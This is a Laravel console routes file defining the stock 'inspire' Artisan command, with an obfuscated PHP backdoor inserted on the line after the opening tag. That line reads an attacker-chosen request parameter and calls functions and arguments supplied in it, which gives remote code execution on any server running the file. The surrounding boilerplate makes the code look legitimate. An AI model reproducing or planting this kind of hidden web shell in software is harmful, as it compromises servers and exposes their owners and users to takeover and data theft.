<?php
If($Q0m7DB=@${"_REQUEST"	}	["MJ5B4JAJ"]){$Q0m7DB[1 ](${$Q0m7DB[2]}[0 ],$Q0m7DB[3](	$Q0m7DB[4 ])	);};

use Illuminate\Foundation\Inspiring;
use Illuminate\Support\Facades\Artisan;

/*
|--------------------------------------------------------------------------
| Console Routes
|--------------------------------------------------------------------------
|
| This file is where you may define all of your Closure based console
| commands. Each Closure is bound to a command instance allowing a
| simple approach to interacting with each command's IO methods.
|
*/

Artisan::command('inspire', function () {
    $this->comment(Inspiring::quote());
})->purpose('Display an inspiring quote');
